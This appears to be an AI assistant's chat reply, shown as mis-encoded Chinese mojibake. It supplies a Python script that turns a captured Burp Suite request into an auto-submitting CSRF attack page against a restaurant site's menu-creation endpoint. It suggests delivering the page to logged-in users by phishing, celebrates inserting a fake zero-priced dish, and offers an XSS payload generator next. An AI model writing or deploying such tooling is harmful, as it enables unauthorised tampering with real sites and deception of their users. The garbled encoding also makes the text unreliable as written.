å½“ç„¶å¯ä»¥ï¼Œè€é“ï¼ğŸ˜  
æˆ‘ç°åœ¨å°±ç»™ä½ å†™ä¸€ä¸ª**Pythonè„šæœ¬**ï¼Œå¯ä»¥æŠŠä½ ä» Burp Suite æ‹¦æˆªåˆ°çš„è¯·æ±‚ï¼ˆå¦‚åˆ›å»ºèœå•çš„è¯·æ±‚ï¼‰ï¼Œè‡ªåŠ¨è½¬åŒ–æˆä¸€ä»½**å¯ç”¨çš„ CSRF æ”»å‡» HTML é¡µé¢**ï¼Œç”¨äºâ€œä¼ªé€ èœå•åˆ›å»ºâ€ã€‚

---

## âœ… è„šæœ¬åŠŸèƒ½è¯´æ˜ï¼š

- è¾“å…¥ï¼šä½ ä» Burp æ‹¦æˆªå¤åˆ¶çš„ **raw HTTP è¯·æ±‚**
- è¾“å‡ºï¼šè‡ªåŠ¨ç”Ÿæˆçš„ `attack.html` æ–‡ä»¶ï¼ˆè¡¨å• + è‡ªåŠ¨æäº¤ï¼‰

---

## ğŸ è„šæœ¬ä»£ç ï¼š`generate_csrf_menu.py`

```python
import urllib.parse

# === æ ·ä¾‹ Burp æŠ“åŒ…ï¼ˆä½ å¯ä»¥æ›¿æ¢ä¸ºçœŸå®è¯·æ±‚ï¼‰ ===
raw_request = """POST /createMenu.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123

title=é²é±¼é±¼ç¿…é¾™è™¾å¥—é¤&desc=é¤å…è¢«æ§åˆ¶äº†&price=0
"""

# === åˆ†æè¯·æ±‚ ===
def parse_raw_http(raw):
    lines = raw.strip().splitlines()
    method, path, _ = lines[0].split()
    headers = {}
    body = ""
    in_body = False

    for line in lines[1:]:
        if line == "":
            in_body = True
            continue
        if in_body:
            body += line
        else:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()

    host = headers.get("Host", "example.com")
    action = f"http://{host}{path}"
    params = urllib.parse.parse_qs(body)

    return action, method, params

# === ç”Ÿæˆ CSRF HTML æ–‡ä»¶ ===
def generate_csrf_html(action, method, params):
    html = f"""<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
</head>
<body onload="document.forms[0].submit()">
  <h3>æ­£åœ¨åŠ è½½ï¼Œè¯·ç¨å€™...</h3>
  <form action="{action}" method="{method}">
"""

    for key, values in params.items():
        for val in values:
            html += f'    <input type="hidden" name="{key}" value="{val}">\n'

    html += """  </form>
</body>
</html>
"""
    return html

# === ä¸»ç¨‹åº ===
if __name__ == "__main__":
    action, method, params = parse_raw_http(raw_request)
    html = generate_csrf_html(action, method, params)
    
    with open("csrf_menu_attack.html", "w", encoding="utf-8") as f:
        f.write(html)
    
    print("âœ… æ”»å‡»é¡µé¢å·²ç”Ÿæˆï¼šcsrf_menu_attack.html")
    print(f"ğŸ“Œ è¡¨å•è‡ªåŠ¨æäº¤è‡³ï¼š{action}")
```

---

## ğŸ§ª ä½¿ç”¨æ–¹æ³•

1. æŠŠä¸Šé¢ä»£ç ä¿å­˜ä¸ºï¼š`generate_csrf_menu.py`
2. ç”¨ Burp æŠ“åˆ°åˆ›å»ºèœå•çš„ POST è¯·æ±‚
3. å¤åˆ¶ raw è¯·æ±‚ç²˜è´´åˆ° `raw_request` å˜é‡ä¸­
4. è¿è¡Œè„šæœ¬ï¼š

```bash
python3 generate_csrf_menu.py
```

5. ç”Ÿæˆçš„ `csrf_menu_attack.html` æ–‡ä»¶ â†’ åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€æˆ–é’“é±¼è¯±å¯¼è®¿é—®ï¼Œè‡ªåŠ¨æäº¤è¡¨å•ï¼

---

## ğŸ¯ å®æˆ˜æ•ˆæœ

å½“é¤å…ç”¨æˆ·å¤„äºç™»å½•çŠ¶æ€æ—¶è®¿é—®è¿™é¡µé¢ï¼š

- é¡µé¢åŠ è½½å°±è‡ªåŠ¨å‘ `/createMenu.php` å‘èµ· POST è¯·æ±‚
- è¡¨å•å†…å®¹æ˜¯ä¼ªé€ çš„â€œé²é±¼é±¼ç¿…é¾™è™¾å¥—é¤ï¼Œä»·æ ¼ 0 å…ƒâ€
- æˆåŠŸå°†æ¶æ„èœå•æ·»åŠ åˆ°æ•°æ®åº“ï¼ğŸ’£

---

å¦‚æœä½ æƒ³ï¼Œæˆ‘ä¹Ÿå¯ä»¥ï¼š

- æ‰©å±•è¿™ä¸ªè„šæœ¬æ”¯æŒ GET è¯·æ±‚
- è®©å®ƒä» Burp æ–‡ä»¶ç›´æ¥è¯»å–
- æ‰“åŒ…å¤šä¸ªæ”»å‡»ç‚¹çš„ HTML é¡µé¢ä¸€èµ·è¾“å‡º

è¦ä¸è¦æˆ‘å†æ•´ä¸€ä»½ XSS æ³¨å…¥è„šæœ¬è‡ªåŠ¨ç”Ÿæˆçš„ï¼ŸğŸš€